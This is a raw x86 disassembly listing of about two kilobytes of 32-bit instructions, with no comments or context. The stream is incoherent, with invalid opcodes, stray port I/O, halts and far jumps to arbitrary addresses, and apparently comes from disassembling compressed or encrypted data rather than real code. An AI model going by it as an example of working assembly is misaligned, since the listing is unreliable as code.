  409c3e:	xchg   edi,eax
  409c3f:	and    BYTE PTR [ecx+0x67b79b52],ah
  409c45:	in     eax,0xd
  409c47:	test   al,0x14
  409c49:	mov    al,ds:0x7382f0e5
  409c4e:	mov    al,ds:0xd879ba94
  409c53:	rcr    BYTE PTR [ecx-0x54],cl
  409c56:	hlt    
  409c57:	dec    eax
  409c58:	xchg   DWORD PTR [ecx],ecx
  409c5a:	in     al,0x4f
  409c5c:	rcl    DWORD PTR [edi-0x6b],1
  409c5f:	mov    edi,0x51a973b9
  409c64:	ret    
  409c65:	test   eax,0xefbbab82
  409c6a:	dec    edi
  409c6b:	scas   al,BYTE PTR es:[edi]
  409c6c:	sar    dh,1
  409c6e:	cmp    al,0x85
  409c70:	sub    BYTE PTR [esp+ebp*2-0x558b2e32],0xce
  409c78:	xor    eax,0xff9ae3b2
  409c7d:	xlat   BYTE PTR ds:[ebx]
  409c7e:	stc    
  409c7f:	jmp    0x409cba
  409c81:	iret   
  409c82:	rcr    DWORD PTR [edi+0x1e],cl
  409c85:	ja     0x409c5d
  409c87:	sbb    DWORD PTR [eax-0x1ff41502],edx
  409c8d:	fstp   st(0)
  409c8f:	std    
  409c90:	pusha  
  409c91:	dec    edi
  409c92:	stos   DWORD PTR es:[edi],eax
  409c93:	into   
  409c94:	mov    ch,0x35
  409c96:	outs   dx,DWORD PTR ds:[esi]
  409c97:	push   ds
  409c98:	inc    eax
  409c99:	mov    ?,WORD PTR [eax-0x49]
  409c9c:	(bad)  
  409c9d:	cmp    ecx,ebx
  409c9f:	mov    al,0x7f
  409ca1:	xchg   BYTE PTR [edx-0x2f],dl
  409ca4:	clc    
  409ca5:	int3   
  409ca6:	cmp    eax,0x110b70ac
  409cab:	pop    edi
  409cac:	out    dx,al
  409cad:	and    al,0xb6
  409caf:	ret    
  409cb0:	fbstp  TBYTE PTR [edi+0x7faa3d20]
  409cb6:	mov    bh,0x44
  409cb8:	and    al,0x3d
  409cba:	mov    ch,0xb2
  409cbc:	jmp    0x3f6355b4
  409cc1:	inc    eax
  409cc2:	pop    ebp
  409cc3:	std    
  409cc4:	(bad)  
  409cc5:	call   0x373b17a6
  409cca:	imul   esp,DWORD PTR [ecx],0x6e
  409ccd:	test   al,0x37
  409ccf:	es out dx,eax
  409cd1:	sub    ecx,DWORD PTR [ebp+edi*8-0x62216de7]
  409cd8:	shl    BYTE PTR [eax+0x429bb55b],cl
  409cde:	fidiv  WORD PTR [ecx+0xa]
  409ce1:	xchg   BYTE PTR [edi+0x16],bh
  409ce4:	mov    edx,0x2424d963
  409ce9:	mov    eax,DWORD PTR [ecx]
  409ceb:	stos   DWORD PTR es:[edi],eax
  409cec:	jb     0x409cb4
  409cee:	jno    0x409d0a
  409cf0:	mov    ah,0xeb
  409cf2:	inc    edi
  409cf3:	test   DWORD PTR [edx-0x70e48af9],eax
  409cf9:	inc    eax
  409cfa:	push   ebp
  409cfb:	sub    eax,eax
  409cfd:	fadd   st,st(3)
  409cff:	adc    bl,bl
  409d01:	pop    edx
  409d02:	mov    WORD PTR [ebp+edx*4-0x2e6ae7c8],fs
  409d09:	retf   0x687b
  409d0c:	sbb    eax,0x84819e2
  409d11:	add    al,0x61
  409d13:	ficom  WORD PTR [ecx+0xa]
  409d16:	mov    ebx,0xd810f1b6
  409d1b:	and    dh,bl
  409d1d:	inc    esp
  409d1e:	aad    0x53
  409d20:	or     bh,BYTE PTR [esi-0x5f]
  409d23:	xchg   ebx,eax
  409d24:	jecxz  0x409d4d
  409d26:	addr16 sub al,0x5f
  409d29:	fnsave [eax-0x4366235c]
  409d2f:	xchg   edi,eax
  409d30:	sbb    bl,ch
  409d32:	push   ebp
  409d33:	leave  
  409d34:	xchg   esp,eax
  409d35:	cmp    al,0xde
  409d37:	fs jle 0x409d19
  409d3a:	add    ebx,ecx
  409d3c:	sbb    BYTE PTR [ebp+ebx*8+0x48b943a3],dh
  409d43:	mov    esp,0x1b360cab
  409d48:	inc    edi
  409d49:	and    al,0xd
  409d4b:	loope  0x409da6
  409d4d:	dec    eax
  409d4e:	(bad)  
  409d4f:	out    0xf9,eax
  409d51:	xchg   DWORD PTR [ebx+ebp*8-0x3],esi
  409d55:	gs int3 
  409d57:	cmp    eax,0xc22daba3
  409d5c:	inc    esp
  409d5d:	mov    ?,esi
  409d5f:	cmp    DWORD PTR [ecx-0x32],esi
  409d62:	add    bh,ah
  409d64:	aam    0x72
  409d66:	imul   esp,ebx,0x2583dcc6
  409d6c:	inc    ecx
  409d6d:	pop    edi
  409d6e:	or     BYTE PTR [ebx+0xffd94eb],cl
  409d74:	mov    DWORD PTR [esi+0x4d92f6e5],eax
  409d7a:	repnz add eax,0xab454d70
  409d80:	jb     0x409d87
  409d82:	push   ss
  409d83:	adc    edi,DWORD PTR [eax-0x22]
  409d86:	aad    0xf0
  409d88:	jmp    0xa6dba577
  409d8d:	mov    ds:0xa9153f34,al
  409d92:	sbb    eax,0xed3b5cc1
  409d97:	cmp    al,0xf3
  409d99:	imul   esp,esp,0x571c2f5f
  409d9f:	enter  0xcc4c,0x70
  409da3:	adc    esp,0xfffffffd
  409da6:	xchg   esi,eax
  409da7:	xlat   BYTE PTR ds:[ebx]
  409da8:	ss pop ds
  409daa:	cwde   
  409dab:	rol    BYTE PTR [ebp-0x3437650d],1
  409db1:	shl    DWORD PTR ds:0x29da6704,cl
  409db7:	mov    edx,0xb44e1f6
  409dbc:	pop    esp
  409dbd:	jnp    0x409de5
  409dbf:	push   esi
  409dc0:	nop
  409dc1:	add    esp,DWORD PTR [edx+0x685d80c9]
  409dc7:	and    BYTE PTR [ebp+esi*8-0x36],bl
  409dcb:	pop    ebp
  409dcc:	popa   
  409dcd:	ret    
  409dce:	cmp    DWORD PTR [ecx+ebx*4+0x2fd236c5],ebx
  409dd5:	jne    0x409df6
  409dd7:	mov    esp,0x418dcb9
  409ddc:	into   
  409ddd:	(bad)  
  409dde:	push   eax
  409ddf:	or     al,0x13
  409de1:	in     eax,0x31
  409de3:	repz test al,0x2c
  409de6:	jp     0x409d79
  409de8:	outs   dx,BYTE PTR ds:[esi]
  409de9:	bound  edi,QWORD PTR [edi+0xf02968d]
  409def:	push   es
  409df0:	repz out dx,eax
  409df2:	aad    0xed
  409df4:	xchg   edx,eax
  409df5:	je     0x409d9b
  409df7:	dec    ecx
  409df8:	inc    ebp
  409df9:	les    edi,FWORD PTR [ebx-0x51825399]
  409dff:	lea    edi,[ebx-0x12de63ba]
  409e05:	mov    bl,0x4c
  409e07:	nop
  409e08:	dec    eax
  409e09:	sahf   
  409e0a:	pop    edi
  409e0b:	aaa    
  409e0c:	mov    ch,0xe8
  409e0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e0f:	fwait
  409e10:	jns    0x409e24
  409e12:	loope  0x409dcf
  409e14:	sub    DWORD PTR [ebx+0x50],ecx
  409e17:	inc    ecx
  409e18:	hlt    
  409e19:	fst    DWORD PTR [edx-0x1a66fa52]
  409e1f:	clc    
  409e20:	loope  0x409e87
  409e22:	and    ch,BYTE PTR [ecx-0x24]
  409e25:	and    BYTE PTR [ecx],0x4
  409e28:	(bad)  
  409e29:	fimul  DWORD PTR [ecx]
  409e2b:	cmp    eax,0x3e36a2ef
  409e30:	das    
  409e31:	xor    BYTE PTR [edi-0x8],dh
  409e34:	loope  0x409ea2
  409e36:	stc    
  409e37:	pop    eax
  409e38:	dec    ebx
  409e39:	ins    DWORD PTR es:[edi],dx
  409e3a:	cld    
  409e3b:	test   DWORD PTR [ecx],ecx
  409e3d:	int3   
  409e3e:	sub    bh,BYTE PTR [esi+0x4b]
  409e41:	mov    ecx,0x6418f501
  409e46:	dec    ebp
  409e47:	inc    ebx
  409e48:	xor    eax,0xba59ea46
  409e4d:	sub    DWORD PTR [ebx],0xd3a6f862
  409e53:	inc    esi
  409e54:	or     al,0x27
  409e56:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  409e58:	and    bl,BYTE PTR [esi-0x28]
  409e5b:	call   0x54bd:0x179b5829
  409e62:	nop
  409e63:	(bad)  
  409e64:	(bad)  
  409e66:	shl    ecx,1
  409e68:	adc    dl,BYTE PTR [edx-0x4a]
  409e6b:	xchg   esp,eax
  409e6c:	cld    
  409e6d:	nop
  409e6e:	lahf   
  409e6f:	jb     0x409ea3
  409e71:	mov    dl,BYTE PTR [ebx+eax*1-0x31]
  409e75:	int    0xff
  409e77:	rcl    DWORD PTR [edx],1
  409e79:	das    
  409e7a:	mov    dl,0x33
  409e7c:	fucomip st,st(1)
  409e7e:	xchg   esi,eax
  409e7f:	pop    ds
  409e80:	je     0x409eab
  409e82:	push   ss
  409e83:	jmp    0x787f:0x77257567
  409e8a:	jle    0x409e9a
  409e8c:	pop    ecx
  409e8d:	pop    ecx
  409e8e:	pushf  
  409e8f:	sub    al,0xc6
  409e91:	jmp    0x54f8:0x315ce2d0
  409e98:	fst    QWORD PTR [ecx]
  409e9a:	jge    0x409e8b
  409e9c:	add    DWORD PTR [eax+0x68],eax
  409e9f:	mov    ds:0x79052294,eax
  409ea4:	xchg   BYTE PTR [ecx+ebx*4+0x2a25c431],dl
  409eab:	push   ebx
  409eac:	sbb    edi,DWORD PTR fs:[ecx]
  409eaf:	pop    eax
  409eb0:	dec    eax
  409eb1:	mov    WORD PTR [ebx+0x2a422ded],es
  409eb7:	mov    bh,0x3b
  409eb9:	out    0xd2,eax
  409ebb:	inc    ecx
  409ebc:	mov    bl,0x9f
  409ebe:	mov    al,ds:0xa6d89bb
  409ec3:	push   0x61
  409ec5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ec6:	or     al,0xf
  409ec8:	xchg   esp,eax
  409ec9:	jg     0x409e9f
  409ecb:	pop    ds
  409ecc:	pop    eax
  409ecd:	xor    edi,DWORD PTR [ebx+esi*1+0x3c361590]
  409ed4:	ror    BYTE PTR [ebp+0x36],1
  409ed7:	addr16 cwde 
  409ed9:	cmp    edx,edi
  409edb:	ja     0x409ec2
  409edd:	inc    ebx
  409ede:	call   0x3e17:0xb4ef8458
  409ee5:	bound  ebp,QWORD PTR [esi-0x7399eb97]
  409eeb:	xor    ah,BYTE PTR [ebp+0x55f6686]
  409ef1:	jp     0x409ef0
  409ef3:	adc    DWORD PTR [ebx+0x28cdf692],edx
  409ef9:	cmp    DWORD PTR [edx-0x31],ebx
  409efc:	sub    ch,BYTE PTR [esi+eax*1-0x170f2343]
  409f03:	arpl   WORD PTR [edi+0x49],bx
  409f06:	push   ebx
  409f07:	mov    eax,ds:0x1ae3700
  409f0c:	push   esp
  409f0d:	or     eax,0xa203b49a
  409f12:	mov    edx,0x2739a37e
  409f17:	xor    al,0x4c
  409f19:	sub    bh,al
  409f1b:	mov    bh,0x22
  409f1d:	es jns 0x409ede
  409f20:	scas   al,BYTE PTR es:[edi]
  409f21:	jg     0x409ea7
  409f23:	adc    BYTE PTR [edx-0x33],ch
  409f26:	ss push esp
  409f28:	mov    eax,0xfc64c16
  409f2d:	jge    0x409f12
  409f2f:	sub    edi,DWORD PTR [esp+edx*4+0x221757a7]
  409f36:	mov    edi,0x324f8795
  409f3b:	xchg   ebx,eax
  409f3c:	sti    
  409f3d:	xor    BYTE PTR [ecx-0x26d1d302],ch
  409f43:	fldenv [edx-0x7b9f3d4d]
  409f49:	jmp    0xe4dd:0x28b025b2
  409f50:	popa   
  409f51:	dec    edi
  409f52:	test   eax,esi
  409f54:	icebp  
  409f55:	ins    BYTE PTR es:[edi],dx
  409f56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f57:	add    DWORD PTR [ebx],edx
  409f59:	xor    ebx,DWORD PTR ds:0x5843b5c4
  409f5f:	mov    ah,BYTE PTR [edi+0x1cec43db]
  409f65:	mov    BYTE PTR [ebp-0x6bdcf657],cl
  409f6b:	ficomp DWORD PTR [ebx-0x70]
  409f6e:	mov    ds:0x9267e1dd,al
  409f73:	pushf  
  409f74:	popa   
  409f75:	or     DWORD PTR [eax],esi
  409f77:	imul   esp,ecx,0x1a
  409f7a:	push   ecx
  409f7b:	xchg   edx,eax
  409f7c:	aaa    
  409f7d:	and    al,0x3
  409f7f:	xlat   BYTE PTR ds:[ebx]
  409f80:	pop    edi
  409f81:	and    al,0x39
  409f83:	jns    0x409f6b
  409f85:	mov    bh,0xd1
  409f87:	pop    ebx
  409f88:	push   ss
  409f89:	fstp   DWORD PTR [ebx]
  409f8b:	push   0x96da5dc6
  409f90:	dec    esp
  409f91:	xor    dh,BYTE PTR [ebp-0x51]
  409f94:	adc    BYTE PTR [eax],cl
  409f96:	loop   0x409f69
  409f98:	mov    bl,dh
  409f9a:	repnz pop ds
  409f9c:	cmc    
  409f9d:	xchg   ebx,eax
  409f9e:	popa   
  409f9f:	enter  0xccc2,0x36
  409fa3:	pushf  
  409fa4:	dec    ebx
  409fa5:	outs   dx,DWORD PTR ds:[esi]
  409fa6:	and    ah,ch
  409fa8:	ins    DWORD PTR es:[edi],dx
  409fa9:	cs shl ecx,cl
  409fac:	add    edi,DWORD PTR [ebx-0x4]
  409faf:	test   esp,edi
  409fb1:	les    ecx,FWORD PTR [edi]
  409fb3:	adc    DWORD PTR [esi],edi
  409fb5:	push   cs
  409fb6:	cs in  al,0x5f
  409fb9:	ja     0x409f5d
  409fbb:	loopne 0x40a010
  409fbd:	xor    al,0xbb
  409fbf:	mov    esi,0x9cb8b31a
  409fc4:	add    cl,ah
  409fc6:	mov    cl,0x96
  409fc8:	or     DWORD PTR [edx],esp
  409fca:	mov    ecx,0x5b7a6911
  409fcf:	jp     0x409f70
  409fd1:	(bad)  
  409fd2:	or     eax,esp
  409fd4:	test   DWORD PTR [edx],ebx
  409fd6:	fcom   QWORD PTR [ebp+0x134168ae]
  409fdc:	out    0xa6,eax
  409fde:	mul    dl
  409fe0:	enter  0xf8e3,0x85
  409fe4:	ins    BYTE PTR es:[edi],dx
  409fe5:	fmul   st(4),st
  409fe7:	sub    al,0xb6
  409fe9:	mov    WORD PTR [ecx],fs
  409feb:	mov    bh,0x73
  409fed:	idiv   DWORD PTR [edi+eiz*4+0x39]
  409ff1:	sub    DWORD PTR [esp+ecx*1],edx
  409ff4:	adc    ebp,DWORD PTR [edx+0x46e3614c]
  409ffa:	repz and edi,edi
  409ffd:	inc    esp
  409ffe:	lods   eax,DWORD PTR ds:[esi]
  409fff:	repz mov esi,0xf4f636ef
  40a005:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a006:	outs   dx,BYTE PTR ds:[esi]
  40a007:	jne    0x409fc7
  40a009:	ja     0x409fba
  40a00b:	rcl    BYTE PTR [edx+0x27e98c90],0xa6
  40a012:	lods   al,BYTE PTR ds:[esi]
  40a013:	dec    ebp
  40a014:	scas   eax,DWORD PTR es:[edi]
  40a015:	repz shr BYTE PTR [eax],1
  40a018:	dec    eax
  40a019:	ret    0x8288
  40a01c:	mov    ecx,0x3bb82e5
  40a021:	inc    ecx
  40a022:	jg     0x409fe7
  40a024:	nop
  40a025:	inc    ecx
  40a026:	jl     0x40a02c
  40a028:	ja     0x40a03c
  40a02a:	mov    BYTE PTR [ebp+0x8],dh
  40a02d:	sbb    DWORD PTR [ebx+eax*1],0xffffffe3
  40a031:	stos   DWORD PTR es:[edi],eax
  40a032:	inc    ecx
  40a033:	jne    0x40a089
  40a035:	rcl    cl,cl
  40a037:	mov    bl,dh
  40a039:	xor    eax,0x51e1ce4d
  40a03e:	dec    edx
  40a03f:	cmp    cl,BYTE PTR [eax+0x71a7e163]
  40a045:	out    0xba,eax
  40a047:	mov    al,0x15
  40a049:	shr    ebx,cl
  40a04b:	dec    ecx
  40a04c:	pusha  
  40a04d:	jg     0x40a0a8
  40a04f:	jns    0x40a04c
  40a051:	xchg   edx,eax
  40a052:	and    eax,0xa2be3a40
  40a057:	sub    cl,cl
  40a059:	xor    dh,bh
  40a05b:	jns    0x40a05d
  40a05d:	repnz adc ebx,ecx
  40a060:	push   edx
  40a061:	ins    BYTE PTR es:[edi],dx
  40a062:	ins    BYTE PTR es:[edi],dx
  40a063:	out    0x8e,al
  40a065:	sbb    BYTE PTR [eax+eax*1-0x26],dh
  40a069:	jge    0x40a046
  40a06b:	out    dx,al
  40a06c:	mov    ebx,0x2a07c3a6
  40a071:	adc    edx,DWORD PTR [esi+0x28]
  40a074:	push   esi
  40a075:	push   cs
  40a076:	mov    dh,0xe8
  40a078:	js     0x40a040
  40a07a:	js     0x40a092
  40a07c:	xor    BYTE PTR [eax+0x545a021b],0xc3
  40a083:	jl     0x40a03a
  40a085:	push   eax
  40a086:	mov    ds:0xc94f96e4,al
  40a08b:	outs   dx,BYTE PTR ds:[esi]
  40a08c:	xchg   ebx,eax
  40a08d:	cmp    edi,DWORD PTR [ebp-0x5ff3a27d]
  40a093:	pop    DWORD PTR [ebp-0x4c]
  40a096:	add    edx,DWORD PTR [edx+0x43]
  40a099:	je     0x40a03f
  40a09b:	in     al,0x9b
  40a09d:	mov    al,0x94
  40a09f:	and    DWORD PTR [ebx],esp
  40a0a1:	mov    bh,0xfa
  40a0a3:	loop   0x40a063
  40a0a5:	cmp    ebp,edx
  40a0a7:	test   BYTE PTR [ecx],dl
  40a0a9:	shl    DWORD PTR [edx-0x42],0x28
  40a0ad:	dec    esp
  40a0ae:	push   eax
  40a0af:	push   ebp
  40a0b0:	sub    ebp,DWORD PTR [esi+0x1195fc8a]
  40a0b6:	sbb    DWORD PTR [edx-0x1b119ac3],eax
  40a0bc:	xor    al,cl
  40a0be:	stos   DWORD PTR es:[edi],eax
  40a0bf:	enter  0x7fe8,0x88
  40a0c3:	or     dh,BYTE PTR [ecx-0x66c02777]
  40a0c9:	test   DWORD PTR [esi],esp
  40a0cb:	daa    
  40a0cc:	mov    ecx,0xf1ab4677
  40a0d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0d2:	test   BYTE PTR [eax-0x6],0x24
  40a0d6:	mov    ah,0x27
  40a0d8:	inc    ebp
  40a0d9:	dec    edi
  40a0da:	loopne 0x40a12d
  40a0dc:	sar    DWORD PTR [ebp-0xb3cefef],cl
  40a0e2:	mov    cl,0x15
  40a0e4:	(bad)  
  40a0e5:	mov    ah,0x45
  40a0e7:	sbb    eax,0x9ad12bfe
  40a0ec:	test   eax,0xcc65014b
  40a0f1:	aas    
  40a0f2:	and    dh,BYTE PTR [ebx+ecx*8-0x79]
  40a0f6:	stc    
  40a0f7:	cdq    
  40a0f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0f9:	or     eax,0xd7a406d4
  40a0fe:	mov    ah,0x9a
  40a100:	push   ecx
  40a101:	mov    al,0xf5
  40a103:	out    dx,eax
  40a104:	loope  0x40a147
  40a106:	imul   eax,ebx,0xf3e9eafe
  40a10c:	arpl   WORD PTR [edx-0x61],bx
  40a10f:	dec    edx
  40a110:	jbe    0x40a114
  40a112:	mov    eax,0x1b295ec1
  40a117:	(bad)  
  40a118:	std    
  40a119:	cmc    
  40a11a:	mov    WORD PTR [ecx+0x57],ds
  40a11d:	pop    esi
  40a11e:	pusha  
  40a11f:	js     0x40a14d
  40a121:	pop    ebp
  40a122:	adc    DWORD PTR [ecx+0x65],ebp
  40a125:	xor    al,ch
  40a127:	xchg   esi,eax
  40a128:	data16 stc 
  40a12a:	leave  
  40a12b:	das    
  40a12c:	call   0xd0c23462
  40a131:	out    dx,eax
  40a132:	sti    
  40a133:	icebp  
  40a134:	jmp    0xf38b5394
  40a139:	jno    0x40a0f2
  40a13b:	inc    eax
  40a13c:	cmp    BYTE PTR [esi],bl
  40a13e:	mov    bl,BYTE PTR [edi+eiz*8-0x2c]
  40a142:	aad    0x8a
  40a144:	adc    ch,BYTE PTR [edi]
  40a146:	adc    BYTE PTR [ebx],0x2c
  40a149:	xchg   DWORD PTR [ebp+0x61774d6e],esi
  40a14f:	enter  0x9b7e,0x4b
  40a153:	fdivr  QWORD PTR [ecx+0x1a59e8bf]
  40a159:	pop    eax
  40a15a:	leave  
  40a15b:	inc    edx
  40a15c:	jg     0x40a11c
  40a15e:	sub    al,0x11
  40a160:	ret    0xcfb8
  40a163:	adc    BYTE PTR [edx+0x4d6475dc],al
  40a169:	outs   dx,DWORD PTR ds:[esi]
  40a16a:	call   0x47341881
  40a16f:	mov    esi,0x205aeb41
  40a174:	fdiv   DWORD PTR [ecx]
  40a176:	pop    eax
  40a177:	dec    eax
  40a178:	cmp    al,0xba
  40a17a:	add    ch,bl
  40a17c:	jmp    0xcc8:0xbb20be88
  40a183:	push   es
  40a184:	pop    edi
  40a185:	push   0x97ff8f31
  40a18a:	test   eax,0xfbda71f5
  40a18f:	(bad)
  40a192:	push   ebx
  40a193:	ret    0x65a2
  40a196:	and    eax,0xd666b525
  40a19b:	ret    0xe72c
  40a19e:	mov    ecx,0x702ce5ad
  40a1a3:	inc    edi
  40a1a4:	int3   
  40a1a5:	mov    ecx,0x32a53687
  40a1aa:	jbe    0x40a19f
  40a1ac:	test   DWORD PTR [edx-0x5581377e],ebx
  40a1b2:	ja     0x40a176
  40a1b4:	sti    
  40a1b5:	imul   eax,ecx,0x7e
  40a1b8:	jns    0x40a1e0
  40a1ba:	test   BYTE PTR [ecx+esi*1],dh
  40a1bd:	inc    ebx
  40a1be:	mov    al,bh
  40a1c0:	js     0x40a184
  40a1c2:	loopne 0x40a197
  40a1c4:	xor    eax,0x9af13479
  40a1c9:	stc    
  40a1ca:	das    
  40a1cb:	mov    ah,0x76
  40a1cd:	cld    
  40a1ce:	mov    cl,0x9c
  40a1d0:	sbb    ebp,DWORD PTR [edi-0x43161bb6]
  40a1d6:	aam    0x4e
  40a1d8:	(bad)  
  40a1da:	in     eax,dx
  40a1db:	pop    edi
  40a1dc:	cmp    al,0xba
  40a1de:	sbb    eax,0x34f68898
  40a1e3:	xchg   ecx,eax
  40a1e4:	cmp    ecx,ebp
  40a1e6:	pop    eax
  40a1e7:	jecxz  0x40a18b
  40a1e9:	xchg   ecx,eax
  40a1ea:	or     edi,esp
  40a1ec:	fs cmp al,0x98
  40a1ef:	jmp    0x40a1c6
  40a1f1:	test   DWORD PTR [ebp+0x7b],0x6017a29d
  40a1f8:	scas   al,BYTE PTR es:[edi]
  40a1f9:	out    dx,eax
  40a1fa:	and    al,0xe3
  40a1fd:	dec    esi
  40a1fe:	clc    
  40a1ff:	fnstcw WORD PTR [edx+0x7aa6018f]
  40a205:	test   BYTE PTR [ebp-0x31],0x96
  40a209:	ret    
  40a20a:	sbb    DWORD PTR [edx],ecx
  40a20c:	mov    eax,0xfdcdc7d5
  40a211:	xchg   esp,eax
  40a212:	pop    edx
  40a213:	xor    BYTE PTR [esi+eiz*1],ah
  40a216:	jl     0x40a1ce
  40a218:	int    0x8f
  40a21a:	and    al,0x9f
  40a21c:	inc    ecx
  40a21d:	les    edi,FWORD PTR [eax]
  40a21f:	xchg   edx,eax
  40a220:	cli    
  40a221:	add    al,BYTE PTR [ebx-0x3d047159]
  40a227:	jl     0x40a218
  40a229:	sbb    eax,0xbe181304
  40a22e:	fstp   st(3)
  40a230:	mov    al,ds:0xafc018d7
  40a235:	dec    ebx
  40a236:	pusha  
  40a237:	lea    esi,[edi+0x71]
  40a23a:	cmp    BYTE PTR [edi-0x3e],0x32
  40a23e:	and    ecx,eax
  40a240:	pop    esi
  40a241:	daa    
  40a242:	add    ah,dh
  40a244:	outs   dx,DWORD PTR ds:[esi]
  40a245:	lea    ecx,[ecx-0x64f599db]
  40a24b:	int3   
  40a24c:	lahf   
  40a24d:	sub    DWORD PTR [ebp+0x75],ebx
  40a250:	lea    ax,[edx-0x70262ecc]
  40a257:	sbb    BYTE PTR [edi],dh
  40a259:	adc    ecx,DWORD PTR [esi-0x5c]
  40a25c:	sbb    ch,BYTE PTR [eax-0x288b5ca]
  40a262:	test   eax,0xd1fc2a3e
  40a267:	pop    DWORD PTR [ebp+edx*8-0x40627b6a]
  40a26e:	pop    edi
  40a26f:	and    ah,BYTE PTR [ecx-0x698ba080]
  40a275:	clc    
  40a276:	shr    bl,0xf9
  40a279:	dec    esi
  40a27a:	jecxz  0x40a214
  40a27c:	inc    esi
  40a27d:	call   0xb1841fae
  40a282:	mov    cl,0x24
  40a284:	sbb    ch,BYTE PTR [esi+0x43]
  40a287:	ins    BYTE PTR es:[edi],dx
  40a288:	mov    eax,ds:0x622884cd
  40a28d:	ror    DWORD PTR [eax+0xfd04558],1
  40a293:	aad    0x61
  40a295:	rcr    BYTE PTR [ebx-0x571a9c17],cl
  40a29b:	ins    DWORD PTR es:[edi],dx
  40a29c:	pushf  
  40a29d:	loopne 0x40a30b
  40a29f:	xchg   esp,eax
  40a2a0:	ret    
  40a2a1:	rol    BYTE PTR ds:0xb73d3e2b,cl
  40a2a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2a8:	jl     0x40a31b
  40a2aa:	jns    0x40a291
  40a2ac:	push   es
  40a2ad:	fs mov cl,ah
  40a2b0:	dec    esp
  40a2b1:	shr    BYTE PTR [eax],cl
  40a2b3:	das    
  40a2b4:	mov    dh,BYTE PTR [eax+eiz*8+0x6bcbf6b9]
  40a2bb:	das    
  40a2bc:	mov    ebp,0x900508dd
  40a2c1:	jnp    0x40a273
  40a2c3:	adc    DWORD PTR [edx+ebp*8-0x5bc59f78],edi
  40a2ca:	jne    0x40a259
  40a2cc:	adc    DWORD PTR [ebx+0x72c5419d],0xffffffe6
  40a2d3:	mov    dh,0xb4
  40a2d5:	dec    ebp
  40a2d6:	and    ebp,DWORD PTR [eax+edi*1]
  40a2d9:	mov    cl,0xaf
  40a2db:	and    dl,BYTE PTR [edx-0x544d7901]
  40a2e1:	in     al,dx
  40a2e2:	(bad)  
  40a2e3:	aad    0x7
  40a2e5:	push   0x66
  40a2e7:	jmp    FWORD PTR [edi+0x2e33d45d]
  40a2ed:	mov    ds:0x9d753b7,eax
  40a2f2:	fbstp  TBYTE PTR [ecx+0x2a]
  40a2f5:	xor    ebx,edi
  40a2f7:	inc    BYTE PTR [edx+0x39a3f6ea]
  40a2fd:	outs   dx,BYTE PTR ds:[esi]
  40a2fe:	cmp    cl,ch
  40a300:	aaa    
  40a301:	(bad)  
  40a302:	adc    eax,0xa5f7d5e3
  40a307:	push   ebp
  40a308:	jo     0x40a2f2
  40a30a:	clc    
  40a30b:	(bad)  
  40a30c:	adc    ecx,DWORD PTR [ebx+ebp*4]
  40a30f:	sbb    eax,ebx
  40a311:	inc    edi
  40a312:	add    DWORD PTR [eax-0x40],esp
  40a315:	leave  
  40a316:	aas    
  40a317:	inc    esp
  40a318:	push   cs
  40a319:	xor    ch,ah
  40a31b:	inc    eax
  40a31c:	or     esp,esp
  40a31e:	in     eax,dx
  40a31f:	adc    BYTE PTR [ebx],ah
  40a321:	mov    esi,0x918f073
  40a326:	and    al,0xda
  40a328:	(bad)  
  40a329:	clc    
  40a32a:	mov    ebx,0xc2d86289
  40a32f:	push   edx
  40a330:	sahf   
  40a331:	jmp    0x40a364
  40a333:	cmp    ebx,DWORD PTR [ebp-0x36cb1cff]
  40a339:	push   es
  40a33a:	mov    eax,ds:0xd256d7be
  40a33f:	sbb    eax,0xc4dd4a13
  40a344:	push   gs
  40a346:	mov    ecx,0x12ccb939
  40a34b:	and    eax,0x82fd1555
  40a350:	add    eax,0x43893e8d
  40a355:	mov    al,ds:0xe5a71eb3
  40a35a:	push   cs
  40a35b:	push   es
  40a35c:	addr16 adc bl,dl
  40a35f:	and    DWORD PTR [edi+edi*4-0x47],ecx
  40a363:	dec    ebp
  40a364:	scas   al,BYTE PTR es:[edi]
  40a365:	mov    WORD PTR [edi-0x75e5c999],es
  40a36b:	mov    ecx,0xb31bd486
  40a370:	jae    0x40a31f
  40a372:	pop    ds
  40a373:	push   esp
  40a374:	pop    esi
  40a375:	test   BYTE PTR ds:0x8e02a251,al
  40a37b:	pop    ebp
  40a37c:	mov    edi,?
  40a37e:	std    
  40a37f:	sbb    DWORD PTR [edx+0x18],esp
  40a382:	cmp    ah,BYTE PTR [ebp+0x73]
  40a385:	push   ds
  40a386:	cmp    eax,0x1e45c3e9
  40a38b:	xchg   edx,eax
  40a38c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a38d:	(bad)  
  40a38e:	xchg   ebp,eax
  40a38f:	mov    ds:0xb2e832c1,al
  40a394:	cld    
  40a395:	xchg   ebx,eax
  40a396:	jnp    0x40a390
  40a398:	(bad)  
  40a399:	ins    DWORD PTR es:[edi],dx
  40a39a:	xlat   BYTE PTR ds:[ebx]
  40a39b:	adc    al,BYTE PTR [eax+0x33]
  40a39e:	das    
  40a39f:	adc    DWORD PTR ds:0x6d56cfd9,ecx
  40a3a5:	ds (bad) 
  40a3a7:	push   ecx
  40a3a8:	cmp    DWORD PTR [edi],ebp
  40a3aa:	fsub   st,st(5)
  40a3ac:	or     BYTE PTR [ebp-0x24],dh
  40a3af:	mov    ds:0xe1e8f58a,al
  40a3b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a3b5:	jo     0x40a3f4
  40a3b7:	and    al,0xcb
  40a3b9:	shl    BYTE PTR [ebx-0xc13abf0],1
  40a3bf:	cmp    al,BYTE PTR [ebp-0x4c]
  40a3c2:	mov    cl,0xf7
  40a3c4:	add    ebx,eax
  40a3c6:	cli    
  40a3c7:	xor    dh,BYTE PTR [eax+0x58]
  40a3ca:	das    
  40a3cb:	inc    ebx
  40a3cc:	and    bh,BYTE PTR [eax]
  40a3ce:	mov    eax,gs
  40a3d0:	jecxz  0x40a393
  40a3d2:	dec    ebx
  40a3d3:	arpl   cx,si
  40a3d5:	aas    
  40a3d6:	cmp    dh,0x30
  40a3d9:	adc    eax,0x381f33b7
